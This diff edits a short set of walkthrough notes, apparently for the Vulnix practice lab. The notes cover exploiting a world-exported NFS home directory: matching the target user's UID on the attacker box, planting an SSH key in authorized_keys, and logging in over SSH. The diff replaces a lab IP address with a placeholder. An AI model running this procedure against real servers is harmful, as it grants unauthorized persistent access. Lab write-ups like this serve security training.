@@ -1,7 +1,7 @@
 
 
-# showmount -e 172.16.83.128
-Export list for 172.16.83.128:
+# showmount -e [target ip]
+Export list for [target ip]:
 /home/vulnix *
 
 
@@ -10,27 +10,27 @@ Export list for 172.16.83.128:
 #
 
 #
-# Through 1st shell obtained /etc/passwd
+# Attacker creates generic user vulnix on attack box
+# useradd -m vulnix
+
+#
+# Execute uid_enum.sh
+#
+
+#
+# uid_enum finds the appropriate UID:GID number for vulnix on target box
 # vulnix:x:2008:2008::/home/vulnix:/bin/bash
 
 #
-# Created appropriate user on attack box
-# useradd -m -u 2008 vulnix	# access granted
-
-#
-# ssh-keygen
-#
-
-#
+# ssh-keygen (while on user vulnix in attacker box)
 # cat /home/vulnix/.ssh/id_rsa.pub > /tmp/r00t/home/vulnix/.ssh/authorized_keys
-#
 
 #
 # umount /tmp/r00t
 #
 
 #
-# ssh -i /home/vulnix/.ssh/id_rsa vulnix@172.16.83.128
+# ssh -i /home/vulnix/.ssh/id_rsa vulnix@[target ip]
 #
 
 
